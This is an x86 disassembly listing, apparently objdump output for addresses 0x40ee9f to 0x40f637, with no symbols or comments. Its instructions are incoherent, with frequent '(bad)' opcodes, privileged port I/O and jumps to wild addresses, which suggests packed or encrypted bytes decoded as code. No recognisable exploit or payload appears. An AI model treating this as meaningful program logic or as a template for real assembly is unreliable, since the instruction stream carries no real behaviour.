  40ee9f:	sub    ch,BYTE PTR [ebx-0x40]
  40eea2:	popf   
  40eea3:	dec    eax
  40eea4:	push   0x8ac1bc44
  40eea9:	adc    bl,BYTE PTR [edi-0x226b84]
  40eeaf:	sar    DWORD PTR [ebx-0x5c],1
  40eeb2:	push   ebp
  40eeb3:	ror    BYTE PTR [ebx+esi*2-0x28c49209],cl
  40eeba:	int3   
  40eebb:	pop    edx
  40eebc:	pusha  
  40eebd:	in     al,dx
  40eebe:	xor    eax,0x28c0755a
  40eec3:	sub    esp,ebp
  40eec5:	mov    eax,0x83686c07
  40eeca:	jl     0x40eed4
  40eecc:	outs   dx,BYTE PTR ds:[esi]
  40eecd:	stc    
  40eece:	pop    edx
  40eecf:	in     eax,0x8b
  40eed1:	push   ebx
  40eed2:	jg     0x40ef36
  40eed4:	push   edx
  40eed5:	xor    dh,dl
  40eed7:	in     eax,0x54
  40eed9:	lock adc dl,BYTE PTR [edi]
  40eedc:	jg     0x40eebc
  40eede:	or     edi,DWORD PTR ds:0xe17c644a
  40eee4:	iret   
  40eee5:	dec    ebx
  40eee6:	pop    esi
  40eee7:	in     al,0xfb
  40eee9:	push   ds
  40eeea:	ins    DWORD PTR es:[edi],dx
  40eeeb:	push   0x25a456f4
  40eef0:	xor    eax,0x49b9653
  40eef5:	pop    es
  40eef6:	jbe    0x40eebe
  40eef8:	adc    DWORD PTR [eax],0xffffffe4
  40eefb:	outs   dx,BYTE PTR ds:[esi]
  40eefc:	or     eax,0x7dc2efcd
  40ef01:	inc    BYTE PTR [ebx-0x3c]
  40ef04:	sbb    al,BYTE PTR [esi+0x669a2cb]
  40ef0a:	dec    ebx
  40ef0b:	xchg   edx,eax
  40ef0c:	xchg   ecx,eax
  40ef0d:	mov    eax,ds:0xf556a32e
  40ef12:	stos   DWORD PTR es:[edi],eax
  40ef13:	rcr    ch,0xd6
  40ef16:	mov    bl,0x10
  40ef18:	or     al,0x35
  40ef1a:	or     eax,0xa33de290
  40ef1f:	xchg   DWORD PTR [edx+0x101982b1],ebp
  40ef25:	push   0xc7fee670
  40ef2a:	xor    al,0xcf
  40ef2c:	add    al,0xcb
  40ef2e:	xor    ecx,DWORD PTR [ecx-0x5c]
  40ef31:	mov    bl,0x91
  40ef33:	adc    ecx,DWORD PTR [edi+ebx*2+0x74f8cb01]
  40ef3a:	or     eax,0x8f56dc35
  40ef3f:	nop
  40ef40:	and    eax,0xfe39fc59
  40ef45:	dec    BYTE PTR [ebx]
  40ef47:	scas   al,BYTE PTR es:[edi]
  40ef48:	xor    ah,BYTE PTR [esi-0x75]
  40ef4b:	push   0xffffff9b
  40ef4d:	sbb    ah,ch
  40ef4f:	fsubr  QWORD PTR [ecx]
  40ef51:	loopne 0x40eeeb
  40ef53:	inc    edx
  40ef54:	ins    DWORD PTR es:[edi],dx
  40ef55:	inc    esp
  40ef56:	or     eax,DWORD PTR [ebx+ebp*2]
  40ef59:	jno    0x40ef8d
  40ef5b:	bound  ebp,QWORD PTR [edi]
  40ef5d:	xor    eax,0xe8dfef29
  40ef62:	or     DWORD PTR ds:0x48bd7792,ebx
  40ef68:	mov    cl,BYTE PTR [ecx]
  40ef6a:	pop    ss
  40ef6b:	mov    bh,0x7b
  40ef6d:	adc    dl,dl
  40ef6f:	jb     0x40ef41
  40ef71:	push   0x47
  40ef73:	ja     0x40efe1
  40ef75:	add    al,0xef
  40ef77:	aas    
  40ef78:	sbb    ecx,DWORD PTR [ebp+ebx*2-0x6b]
  40ef7c:	in     al,0x2b
  40ef7e:	fwait
  40ef7f:	lods   al,BYTE PTR ds:[esi]
  40ef80:	or     al,0x21
  40ef82:	mov    ds:0x68ffd8d3,al
  40ef87:	push   eax
  40ef88:	sub    DWORD PTR [eax+eax*2+0x5d],ebx
  40ef8c:	pop    edi
  40ef8d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ef8e:	dec    edi
  40ef8f:	push   es
  40ef90:	mov    cl,0x8d
  40ef92:	mov    ds,WORD PTR [ebp-0x3a]
  40ef95:	sbb    al,0x5a
  40ef97:	jle    0x40f012
  40ef99:	mov    ecx,0xf8c9b949
  40ef9e:	adc    DWORD PTR ds:0x5968ef8d,0xffffffe3
  40efa5:	stc    
  40efa6:	fisttp QWORD PTR [edi-0x8]
  40efa9:	xor    eax,0xe25bb8a9
  40efae:	out    dx,eax
  40efaf:	pushf  
  40efb0:	adc    DWORD PTR [esi+0x1c],esp
  40efb3:	(bad)  
  40efb7:	fwait
  40efb8:	mov    edx,0xeb9138fc
  40efbd:	push   eax
  40efbe:	add    al,0xba
  40efc0:	dec    ecx
  40efc1:	and    ecx,DWORD PTR [ecx-0x3b]
  40efc4:	dec    ebx
  40efc5:	xchg   BYTE PTR [ecx-0x1c],ah
  40efc8:	push   esp
  40efca:	inc    edx
  40efcb:	mov    al,0xdd
  40efcd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40efce:	adc    esp,DWORD PTR ss:[esi]
  40efd1:	fld    TBYTE PTR [edx+0x550ffc37]
  40efd7:	mov    ah,0xf6
  40efd9:	xchg   ebx,ecx
  40efdb:	dec    esp
  40efdc:	mov    eax,0xc4773b72
  40efe1:	inc    ecx
  40efe2:	fucom  st(1)
  40efe4:	mov    esp,0x603bf538
  40efe9:	out    0x88,al
  40efeb:	xor    al,0xc
  40efee:	mov    cl,0x3d
  40eff0:	push   esp
  40eff1:	into   
  40eff2:	aam    0xe3
  40eff4:	and    esi,ebx
  40eff6:	(bad)  
  40eff7:	das    
  40eff8:	ins    BYTE PTR es:[edi],dx
  40eff9:	xchg   BYTE PTR [edx-0x2dc9700e],cl
  40efff:	stos   BYTE PTR es:[edi],al
  40f000:	mov    ebp,DWORD PTR [edi]
  40f002:	inc    ebp
  40f003:	daa    
  40f004:	jnp    0x40f073
  40f006:	adc    BYTE PTR [eax-0x536f6072],al
  40f00c:	test   cl,dh
  40f00e:	inc    ecx
  40f00f:	lock and DWORD PTR [eax],ecx
  40f012:	js     0x40f07c
  40f014:	xor    DWORD PTR [edi+edi*4-0x7c],edx
  40f018:	or     DWORD PTR [ebx-0x635303e1],ecx
  40f01e:	push   0x19fa1dc9
  40f023:	mov    ebp,DWORD PTR [ebx+0x78]
  40f026:	hlt    
  40f027:	pop    esp
  40f028:	sbb    edi,ecx
  40f02a:	es and al,0x7f
  40f02d:	mov    esi,0xbb79de5c
  40f032:	xchg   esp,eax
  40f033:	fwait
  40f034:	sbb    edi,edi
  40f036:	mov    ecx,0xa9f7e081
  40f03b:	and    esp,DWORD PTR [ebp+0x6c]
  40f03e:	sub    edx,DWORD PTR [ebp+edx*8+0xdd3edd6]
  40f045:	in     eax,0x9a
  40f047:	mov    cl,0xda
  40f049:	(bad)  
  40f04a:	out    0xaf,al
  40f04c:	jno    0x40f02d
  40f04e:	test   DWORD PTR [ebx],ebx
  40f050:	enter  0x27d7,0xc5
  40f054:	sahf   
  40f055:	popa   
  40f056:	(bad)  
  40f057:	jb     0x40f07d
  40f059:	xchg   ecx,eax
  40f05a:	inc    edi
  40f05b:	jg     0x40f08c
  40f05d:	(bad)  
  40f05e:	mov    ebp,0x2dd24489
  40f063:	nop
  40f064:	lea    edx,[ecx+0x44e1f00b]
  40f06a:	xchg   dl,bl
  40f06c:	(bad)  
  40f06d:	jmp    0xe2d2d560
  40f072:	pushf  
  40f073:	jge    0x40f09b
  40f075:	cld    
  40f076:	aaa    
  40f077:	jecxz  0x40f078
  40f079:	mov    esp,0x386768e6
  40f07e:	loope  0x40f02d
  40f080:	jno    0x40f09e
  40f082:	mov    ebp,0x5c5a8ed7
  40f087:	sub    bl,cl
  40f089:	or     al,0xe8
  40f08b:	sub    DWORD PTR [ebx-0x4610cd0e],edx
  40f091:	sub    eax,0xc09ccf10
  40f096:	hlt    
  40f097:	xchg   BYTE PTR [eax+0xa],cl
  40f09a:	mov    esp,0x9b3da2a5
  40f09f:	sbb    eax,0x25d767b1
  40f0a4:	fcmovnb st,st(5)
  40f0a6:	loopne 0x40f082
  40f0a8:	out    dx,al
  40f0a9:	jno    0x40f05f
  40f0ab:	in     al,dx
  40f0ac:	jnp    0x40f0ef
  40f0ae:	dec    ecx
  40f0af:	retf   
  40f0b0:	add    dh,BYTE PTR [edx]
  40f0b2:	inc    ebx
  40f0b3:	rcl    BYTE PTR [eax+0x14],cl
  40f0b6:	xor    DWORD PTR [eax-0x44],eax
  40f0b9:	mov    ebx,0xa1b8e087
  40f0be:	push   ebx
  40f0bf:	mov    esp,0x840b6165
  40f0c4:	lea    esp,[esi+0x4c]
  40f0c7:	mov    al,0xb7
  40f0c9:	pop    ss
  40f0ca:	scas   al,BYTE PTR es:[edi]
  40f0cb:	sub    BYTE PTR ds:0x460821d9,0xf8
  40f0d2:	shl    BYTE PTR [bp+si+0x70d9],1
  40f0d7:	and    esp,DWORD PTR [esi]
  40f0d9:	mov    edx,gs
  40f0db:	add    eax,0x94ba3563
  40f0e0:	cdq    
  40f0e1:	pusha  
  40f0e2:	mov    ecx,0xf9f48d83
  40f0e7:	push   ss
  40f0e8:	jp     0x40f076
  40f0ea:	jne    0x40f120
  40f0ec:	pop    eax
  40f0ed:	fstp   QWORD PTR [edi-0x6f0483c1]
  40f0f3:	es daa 
  40f0f5:	(bad)  
  40f0f7:	xchg   esi,ecx
  40f0f9:	jnp    0x40f0a6
  40f0fb:	fldenv [ebx+0x639f90aa]
  40f101:	push   esi
  40f102:	idiv   DWORD PTR [ebx+0x7a]
  40f105:	imul   edi,eax,0x55
  40f108:	icebp  
  40f109:	mov    cl,0x3b
  40f10b:	sub    eax,0xd76696d6
  40f110:	std    
  40f111:	cmp    cl,BYTE PTR [ecx-0x55509bbe]
  40f117:	retf   
  40f118:	mov    ebp,0x3d8d4611
  40f11d:	sar    edi,1
  40f11f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f120:	js     0x40f171
  40f122:	jno    0x40f0f7
  40f124:	xor    eax,0x1654c062
  40f129:	lahf   
  40f12a:	pop    edx
  40f12b:	es daa 
  40f12d:	es pop es
  40f12f:	std    
  40f130:	call   FWORD PTR [ecx+0x32608af]
  40f136:	push   ebp
  40f137:	mov    BYTE PTR [eax],ch
  40f139:	in     al,dx
  40f13a:	adc    DWORD PTR [edx+0x1ef77a29],edi
  40f140:	pop    ecx
  40f141:	ss (bad) 
  40f143:	lods   al,BYTE PTR ds:[esi]
  40f144:	out    0xfb,eax
  40f146:	mov    cl,0xa9
  40f148:	pusha  
  40f149:	shl    BYTE PTR [esp+ebx*2],cl
  40f14c:	retf   
  40f14d:	retf   0x8a1
  40f150:	xor    ecx,DWORD PTR [eax+0x6c]
  40f153:	sbb    eax,0xf95c1bdb
  40f158:	out    dx,al
  40f159:	adc    esp,DWORD PTR fs:[ecx-0x7454cb7f]
  40f160:	push   ecx
  40f161:	inc    edx
  40f162:	dec    edi
  40f163:	mov    dl,0x70
  40f165:	cmp    eax,0x775d6cad
  40f16a:	outs   dx,BYTE PTR ds:[esi]
  40f16b:	pop    ebx
  40f16c:	pop    ss
  40f16d:	xchg   esp,eax
  40f16e:	int    0xd0
  40f170:	nop
  40f171:	nop
  40f172:	xchg   DWORD PTR [ebp+0x54],ebx
  40f175:	push   0xfffffff5
  40f177:	adc    DWORD PTR [ebp-0xb012ea1],esi
  40f17d:	sbb    DWORD PTR [eax],esi
  40f17f:	les    ecx,FWORD PTR [esi+0x8]
  40f182:	idiv   BYTE PTR ds:0x20990cd9
  40f188:	loop   0x40f1e2
  40f18a:	xchg   esp,eax
  40f18b:	mov    ebx,DWORD PTR [ebp-0x5e7bd575]
  40f191:	shl    DWORD PTR [ebp+0x1fef81c9],1
  40f197:	sbb    DWORD PTR fs:[esi+0x7f],edx
  40f19b:	jmp    0x7648ba11
  40f1a0:	push   edx
  40f1a1:	mov    cs,WORD PTR [ecx-0x4de81539]
  40f1a7:	and    eax,0xe3b94a10
  40f1ac:	jecxz  0x40f1ff
  40f1ae:	or     eax,0xf06952
  40f1b3:	out    dx,eax
  40f1b4:	aad    0x1d
  40f1b6:	adc    eax,0x87e72178
  40f1bb:	mov    ?,WORD PTR [edi-0x1f15e7c5]
  40f1c1:	pop    ecx
  40f1c2:	or     esi,eax
  40f1c4:	mul    al
  40f1c6:	ret    
  40f1c7:	or     BYTE PTR [eax-0x2f],al
  40f1ca:	sti    
  40f1cb:	push   ds
  40f1cc:	fbstp  TBYTE PTR [eax+ecx*4-0x7a]
  40f1d0:	sub    al,0xa8
  40f1d2:	jmp    0xb31a951e
  40f1d7:	mov    ebx,0x7975c744
  40f1dc:	dec    edx
  40f1dd:	enter  0x8fef,0x12
  40f1e1:	dec    ebx
  40f1e2:	test   BYTE PTR [eax-0x1fa58036],al
  40f1e8:	adc    esi,ebx
  40f1ea:	mov    edi,0x6cbefe47
  40f1ef:	inc    edi
  40f1f0:	loope  0x40f1d5
  40f1f2:	pop    ds
  40f1f3:	fs dec esi
  40f1f5:	aad    0xf8
  40f1f7:	cmp    BYTE PTR [ebp-0x4e],0xcc
  40f1fb:	rcr    DWORD PTR [eax-0x3d5e6ae1],1
  40f201:	mov    esi,0xb2ee7857
  40f206:	add    eax,0x4e2c76e1
  40f20b:	mov    edx,0xdf276482
  40f210:	dec    ebx
  40f211:	mov    ch,0xd1
  40f213:	ins    BYTE PTR es:[edi],dx
  40f214:	xor    DWORD PTR ds:0x6d95ada5,edi
  40f21a:	fiadd  DWORD PTR [edx+0x77]
  40f21d:	out    dx,al
  40f21e:	pop    ds
  40f21f:	xor    eax,0xbcd94be4
  40f224:	push   ss
  40f225:	push   DWORD PTR [ebx+eiz*2+0x221520a1]
  40f22c:	push   0x382db01
  40f231:	retf   0xba6b
  40f234:	dec    ebp
  40f235:	clc    
  40f236:	mov    WORD PTR [edi-0x6e5b03ab],es
  40f23c:	scas   eax,DWORD PTR es:[edi]
  40f23d:	cdq    
  40f23e:	pop    edx
  40f23f:	xchg   ebp,eax
  40f240:	xchg   bl,cl
  40f242:	aas    
  40f243:	fwait
  40f244:	inc    edx
  40f245:	adc    eax,0x12f470c4
  40f24a:	les    ebp,FWORD PTR [ebx-0x7d]
  40f24d:	push   ecx
  40f24e:	adc    BYTE PTR [ebx],cl
  40f250:	ins    BYTE PTR es:[edi],dx
  40f251:	(bad)  [ebx]
  40f253:	cmp    ebp,DWORD PTR [eax+0xd]
  40f256:	iret   
  40f257:	pop    ecx
  40f258:	jne    0x40f1fb
  40f25a:	imul   esi,esp,0xf60a4e85
  40f260:	jb     0x40f2e0
  40f262:	jmp    0x40f22e
  40f264:	mov    esp,0x6e11449
  40f269:	push   esi
  40f26a:	mov    eax,ds:0x8dacd326
  40f26f:	shl    DWORD PTR [ebx-0x40cef64d],1
  40f275:	fisttp QWORD PTR [edx]
  40f277:	xor    ebp,edi
  40f279:	test   BYTE PTR [ecx+eiz*2-0xe],bl
  40f27d:	dec    esi
  40f27e:	scas   eax,DWORD PTR es:[edi]
  40f27f:	mov    ebx,0xd62ad32e
  40f284:	xor    al,0x28
  40f286:	adc    ch,dh
  40f288:	into   
  40f289:	mov    cl,0xbc
  40f28b:	dec    ebx
  40f28c:	and    BYTE PTR [ebx+0x6f],bl
  40f28f:	retf   0x66dc
  40f292:	aas    
  40f293:	lock shr DWORD PTR cs:[edx],cl
  40f297:	add    al,0x56
  40f299:	mov    ds:0xeb4bef79,eax
  40f29e:	mov    ebp,0xa241146b
  40f2a3:	cmc    
  40f2a4:	pop    ecx
  40f2a5:	cs int3 
  40f2a7:	ins    DWORD PTR es:[edi],dx
  40f2a8:	pop    ecx
  40f2a9:	mov    eax,ds:0x3a0984ff
  40f2ae:	pop    ss
  40f2af:	or     ebx,ebp
  40f2b1:	push   ss
  40f2b2:	cdq    
  40f2b3:	add    BYTE PTR [ecx],cl
  40f2b5:	inc    esp
  40f2b6:	inc    edi
  40f2b7:	pop    eax
  40f2b8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f2b9:	pop    eax
  40f2ba:	es test eax,0xb217781e
  40f2c0:	dec    ecx
  40f2c1:	repz fdivr st,st(2)
  40f2c4:	cmp    DWORD PTR [edx-0x48],esp
  40f2c7:	mov    eax,ds:0x5e7cdf19
  40f2cc:	push   ebx
  40f2cd:	jmp    0x40f314
  40f2cf:	stos   BYTE PTR es:[edi],al
  40f2d0:	pop    edx
  40f2d1:	push   eax
  40f2d2:	out    0xe5,eax
  40f2d4:	shl    DWORD PTR [ebp-0x5e94286b],cl
  40f2da:	xchg   ecx,eax
  40f2db:	sbb    al,0x32
  40f2dd:	or     al,dh
  40f2df:	enter  0x3008,0x35
  40f2e3:	pushf  
  40f2e4:	scas   al,BYTE PTR es:[edi]
  40f2e5:	sub    ecx,esp
  40f2e7:	adc    dh,BYTE PTR [edi+0x213d78a]
  40f2ed:	jns    0x40f2ea
  40f2ef:	sar    ebp,1
  40f2f1:	fs ins DWORD PTR es:[edi],dx
  40f2f3:	jmp    0x1b290d6a
  40f2f8:	(bad)  
  40f2f9:	arpl   WORD PTR [esi],cx
  40f2fb:	retf   
  40f2fc:	sub    eax,0xdea032da
  40f301:	pop    ss
  40f302:	imul   edx,DWORD PTR ds:0x454d20a3,0xffffffee
  40f309:	adc    al,0xfd
  40f30b:	pushf  
  40f30c:	push   ebx
  40f30d:	or     eax,0x764e4967
  40f312:	je     0x40f2e7
  40f314:	mov    ebp,0x93572258
  40f319:	mov    ch,0x7e
  40f31b:	pop    edx
  40f31c:	pop    ebx
  40f31d:	xchg   DWORD PTR [edx+0x2e4f4bad],ebx
  40f323:	push   es
  40f324:	pop    esi
  40f325:	aas    
  40f326:	jl     0x40f35d
  40f328:	sti    
  40f329:	imul   edx,edx,0x33129217
  40f32f:	sub    esi,DWORD PTR [ecx]
  40f331:	push   esp
  40f333:	mov    cs,WORD PTR [esi]
  40f335:	xor    ch,ch
  40f337:	sub    ecx,DWORD PTR [ecx]
  40f339:	jo     0x40f3a3
  40f33b:	mov    esp,0x4f4ae7
  40f340:	sbb    bl,BYTE PTR [ebx+0x63afa192]
  40f346:	jge    0x40f37e
  40f348:	jl     0x40f34f
  40f34a:	pop    ds
  40f34b:	jp     0x40f3cb
  40f34d:	add    ecx,eax
  40f34f:	dec    esi
  40f350:	fs iret 
  40f352:	inc    ebp
  40f353:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f354:	in     eax,0xec
  40f356:	jb     0x40f3c9
  40f358:	sbb    eax,DWORD PTR [esi+edx*4]
  40f35b:	cmp    BYTE PTR [edx+0x37],cl
  40f35e:	ret    0xa161
  40f361:	sub    eax,0x3564fcc4
  40f366:	(bad)  
  40f367:	jmp    0x2ef1c98c
  40f36c:	test   eax,0x1d27bcb9
  40f371:	mov    cs,WORD PTR [edi-0x16]
  40f374:	xor    DWORD PTR [ebp+0x557700a9],eax
  40f37a:	ja     0x40f335
  40f37c:	push   eax
  40f37d:	cmp    eax,0xf090c677
  40f382:	sub    edi,DWORD PTR [ebx-0x6d]
  40f385:	pop    edx
  40f386:	test   DWORD PTR [ebx-0x4e],esp
  40f389:	call   DWORD PTR [ebx+0x79c2a93c]
  40f38f:	ss mov bl,0x6
  40f392:	push   esi
  40f393:	in     al,0xee
  40f395:	lea    edx,[ecx+0x5714bb58]
  40f39b:	out    dx,eax
  40f39c:	call   FWORD PTR [edx+0xc]
  40f39f:	adc    DWORD PTR [esi+0x35369a50],esp
  40f3a5:	or     edi,0xffffffc3
  40f3a8:	push   ss
  40f3a9:	pop    edi
  40f3aa:	jbe    0x40f3b5
  40f3ac:	(bad)  
  40f3ad:	add    ch,al
  40f3af:	mov    es,edi
  40f3b1:	xchg   ebp,eax
  40f3b2:	in     eax,0x63
  40f3b4:	xchg   edi,eax
  40f3b5:	adc    al,0xe9
  40f3b7:	cmp    al,0xbb
  40f3b9:	xor    eax,0x45426dc9
  40f3be:	jmp    0x40f389
  40f3c0:	dec    ebp
  40f3c1:	iret   
  40f3c2:	out    0x78,eax
  40f3c4:	out    dx,al
  40f3c5:	lock stos BYTE PTR es:[edi],al
  40f3c7:	dec    esp
  40f3c8:	mov    eax,0x123b998d
  40f3cd:	inc    esi
  40f3ce:	out    0xa5,eax
  40f3d0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f3d1:	xor    eax,0x5404ccf1
  40f3d6:	into   
  40f3d7:	and    ah,BYTE PTR ds:0x2fb5d21
  40f3dd:	xchg   ecx,eax
  40f3de:	ficomp WORD PTR [eax]
  40f3e0:	fmul   QWORD PTR [ecx+0x7da29e74]
  40f3e6:	test   DWORD PTR [esi-0x1a],esi
  40f3e9:	and    al,0x5c
  40f3eb:	dec    ebp
  40f3ec:	adc    eax,0x54f32806
  40f3f1:	dec    si
  40f3f3:	in     al,0xfa
  40f3f5:	retf   
  40f3f6:	jp     0x40f442
  40f3f8:	pop    ds
  40f3f9:	test   dl,bl
  40f3fb:	or     al,0x70
  40f3fd:	xor    dl,BYTE PTR [edx]
  40f3ff:	pop    ds
  40f400:	add    BYTE PTR [ebx+0x70],cl
  40f403:	fcomp  DWORD PTR fs:[ebx]
  40f406:	inc    eax
  40f408:	xor    esi,ecx
  40f40a:	mov    dl,0xb0
  40f40c:	or     BYTE PTR [esi+eiz*2+0xf],dl
  40f410:	xchg   esi,eax
  40f411:	mov    ds:0xbb4f633f,eax
  40f416:	push   ecx
  40f417:	inc    eax
  40f418:	jp     0x40f3ab
  40f41a:	repz pushf 
  40f41c:	push   ebp
  40f41d:	push   edx
  40f41e:	ret    
  40f41f:	fs leave 
  40f421:	test   DWORD PTR [eax-0x30],ecx
  40f424:	not    eax
  40f426:	mov    esi,0x5ec50ace
  40f42b:	popf   
  40f42c:	push   0x75862b9e
  40f431:	imul   eax,DWORD PTR [esi],0xf097d271
  40f437:	pusha  
  40f438:	stc    
  40f439:	fld    QWORD PTR [edx+0x4b6d7145]
  40f43f:	mov    BYTE PTR [eax],bh
  40f441:	cmp    eax,0x660f6d72
  40f446:	scas   al,BYTE PTR es:[edi]
  40f447:	mov    ds:0x98d43821,al
  40f44c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f44d:	jns    0x40f3dd
  40f44f:	std    
  40f450:	add    al,0x3d
  40f452:	test   al,0x1a
  40f454:	cld    
  40f455:	sbb    ebp,DWORD PTR [ebp+edx*8-0x2a]
  40f459:	call   0xc9e4:0x2ede3a80
  40f460:	add    eax,0x76c50a4c
  40f465:	jae    0x40f447
  40f467:	jecxz  0x40f4ca
  40f469:	jnp    0x40f4ce
  40f46b:	inc    ebx
  40f46c:	or     edi,DWORD PTR [edi]
  40f46e:	sub    cl,BYTE PTR [esi-0x26a286c0]
  40f474:	inc    edx
  40f475:	push   ecx
  40f476:	push   ebp
  40f477:	inc    eax
  40f478:	ror    esi,1
  40f47a:	scas   eax,DWORD PTR es:[edi]
  40f47b:	or     BYTE PTR [ecx+esi*2],dh
  40f47e:	out    dx,eax
  40f47f:	xchg   ecx,eax
  40f480:	sbb    ecx,DWORD PTR [edx-0x7e]
  40f483:	sub    bh,bl
  40f485:	(bad)  
  40f486:	aad    0xb0
  40f488:	sub    DWORD PTR [eax-0x6347e33f],ecx
  40f48e:	mov    eax,ds:0x7acd5fb6
  40f493:	dec    ebp
  40f494:	mov    esp,0x6ebfcf5d
  40f499:	and    esi,edi
  40f49b:	push   es
  40f49c:	aas    
  40f49d:	pusha  
  40f49e:	fadd   st(6),st
  40f4a0:	inc    edi
  40f4a1:	test   BYTE PTR [ebx+0x77],dl
  40f4a4:	inc    edx
  40f4a5:	mov    al,ds:0x7be392ad
  40f4aa:	ja     0x40f47c
  40f4ac:	mov    bl,0x5d
  40f4ae:	dec    eax
  40f4af:	sub    al,0x4a
  40f4b1:	pop    edx
  40f4b2:	sar    ecx,1
  40f4b4:	mov    bh,0xaa
  40f4b6:	call   0x83e6:0x1d14f769
  40f4bd:	ret    
  40f4be:	outs   dx,BYTE PTR ds:[esi]
  40f4bf:	cdq    
  40f4c0:	mov    bh,0x60
  40f4c2:	jb     0x40f4c4
  40f4c4:	repz pop ebp
  40f4c6:	mov    ebp,0xf2e4872c
  40f4cb:	mov    ecx,0xaf57f9db
  40f4d0:	sub    BYTE PTR [ebp-0x3d],dl
  40f4d3:	daa    
  40f4d4:	and    ebp,esi
  40f4d6:	outs   dx,DWORD PTR ds:[esi]
  40f4d7:	cmp    cl,0xd1
  40f4da:	sub    edi,ebx
  40f4dc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f4dd:	jecxz  0x40f506
  40f4df:	dec    eax
  40f4e0:	or     dl,bl
  40f4e2:	loopne 0x40f4b8
  40f4e4:	data16 jmp 0x40f561
  40f4e7:	test   ah,dl
  40f4e9:	adc    esp,DWORD PTR [edx+0x12]
  40f4ec:	imul   ebx,DWORD PTR [eax-0x20b202fc],0xfb3ccd26
  40f4f6:	push   0xffffffdc
  40f4f8:	lods   al,BYTE PTR ds:[esi]
  40f4f9:	int3   
  40f4fa:	cmp    ebp,DWORD PTR [esi-0x30922658]
  40f500:	adc    BYTE PTR [edx-0x327fc500],dh
  40f506:	popf   
  40f507:	dec    edx
  40f508:	xchg   edx,eax
  40f509:	mov    ecx,0x666e60c
  40f50e:	and    bh,BYTE PTR [ecx+0xc881b1d]
  40f514:	jg     0x40f4c8
  40f516:	and    edi,edx
  40f518:	and    eax,0xc356c66a
  40f51d:	scas   al,BYTE PTR es:[edi]
  40f51e:	in     eax,0x6a
  40f520:	mov    ds:0x182f840f,al
  40f525:	and    eax,0xf9a5fce6
  40f52a:	jecxz  0x40f58c
  40f52c:	mov    BYTE PTR [eax-0x5c],0xb7
  40f530:	mov    bl,0x44
  40f532:	add    eax,DWORD PTR [ebp+0x74]
  40f535:	sbb    ebx,0x30a0ad76
  40f53b:	outs   dx,BYTE PTR ds:[esi]
  40f53c:	jnp    0x40f501
  40f53e:	aas    
  40f53f:	xlat   BYTE PTR ds:[ebx]
  40f540:	rol    BYTE PTR [bx-0x73d0],0xca
  40f546:	ss xchg esi,eax
  40f548:	out    0x9a,al
  40f54a:	add    al,0x80
  40f54c:	icebp  
  40f54d:	aas    
  40f54e:	mov    cl,0xb8
  40f550:	pop    ebp
  40f551:	(bad)  
  40f552:	clc    
  40f553:	or     al,0xfa
  40f555:	sbb    ah,bl
  40f557:	paddsb mm6,QWORD PTR [ebx+edi*1-0x2792bec8]
  40f55f:	mov    esi,0x444010de
  40f564:	xlat   BYTE PTR ds:[ebx]
  40f565:	mov    ecx,0x700abf9f
  40f56a:	or     BYTE PTR [edx-0x751f7ee7],dl
  40f570:	daa    
  40f571:	mov    ah,0x5c
  40f573:	mov    ecx,DWORD PTR [edi+edx*2]
  40f576:	jge    0x40f522
  40f578:	scas   al,BYTE PTR es:[edi]
  40f579:	call   FWORD PTR [esi-0x7b]
  40f57c:	mov    BYTE PTR [edi],bh
  40f57e:	push   0x8e10179a
  40f583:	scas   al,BYTE PTR es:[edi]
  40f584:	cmp    eax,0x39518e5
  40f589:	icebp  
  40f58a:	mov    DWORD PTR [ecx],esp
  40f58c:	sahf   
  40f58d:	(bad)  
  40f58e:	mov    ds:0x1b95e884,eax
  40f593:	push   cs
  40f594:	(bad)  
  40f595:	push   ebx
  40f596:	inc    edx
  40f597:	out    0xcf,eax
  40f599:	xchg   esi,eax
  40f59a:	call   0xb55e:0xd97a51e3
  40f5a1:	or     ecx,eax
  40f5a3:	jp     0x40f5ed
  40f5a5:	ins    BYTE PTR es:[edi],dx
  40f5a6:	mov    eax,DWORD PTR [edi-0x3f]
  40f5a9:	push   0xfffffff4
  40f5ab:	iret   
  40f5ac:	cmp    ebx,DWORD PTR [esi-0x38]
  40f5af:	repz test eax,0x6c5dbd04
  40f5b5:	ror    ebp,cl
  40f5b7:	sbb    DWORD PTR ds:0xf143590c,edx
  40f5bd:	adc    eax,0xd14291d2
  40f5c2:	pop    edx
  40f5c3:	je     0x40f5c9
  40f5c5:	or     DWORD PTR [ebp+0x39],0x9d90098a
  40f5cc:	pop    ecx
  40f5cd:	adc    ecx,DWORD PTR [edx]
  40f5cf:	popa   
  40f5d0:	imul   esi,DWORD PTR [esi-0x33be7c58],0xffffffb2
  40f5d7:	xchg   esp,eax
  40f5d8:	dec    eax
  40f5d9:	inc    esp
  40f5da:	fsubr  DWORD PTR [edi]
  40f5dc:	js     0x40f64f
  40f5de:	in     al,0x75
  40f5e0:	mov    eax,0xedd0772e
  40f5e5:	mov    eax,ds:0xe1e1bf5d
  40f5ea:	cmp    DWORD PTR [edi-0x5491f0cc],edx
  40f5f0:	test   DWORD PTR ds:0xd56458a1,edi
  40f5f6:	add    al,0xfd
  40f5f8:	je     0x40f59d
  40f5fa:	iret   
  40f5fb:	jmp    0x40f5c7
  40f5fd:	and    BYTE PTR [eax+esi*8],bh
  40f600:	inc    eax
  40f601:	aam    0x95
  40f603:	stos   DWORD PTR es:[edi],eax
  40f604:	lea    esi,[ecx+eiz*4]
  40f607:	xchg   edx,eax
  40f608:	lea    ebp,[ebx+ebx*4+0x15]
  40f60c:	fisubr DWORD PTR ss:[edi+0x3be8c864]
  40f613:	fld    DWORD PTR [edx-0x3154dd7]
  40f619:	xor    esp,DWORD PTR [edi]
  40f61b:	adc    DWORD PTR [ecx-0x59],edi
  40f61e:	mov    dh,0x8b
  40f620:	sbb    al,0x65
  40f622:	sbb    cl,al
  40f624:	sub    cl,BYTE PTR [ebp+esi*2+0x4]
  40f628:	scas   al,BYTE PTR es:[edi]
  40f629:	scas   eax,DWORD PTR es:[edi]
  40f62a:	cs mov ?,esp
  40f62d:	mov    bl,0xb4
  40f62f:	call   0x7ec5d422
  40f634:	pop    es
  40f635:	sti    
  40f636:	pop    eax
  40f637:	push   eax
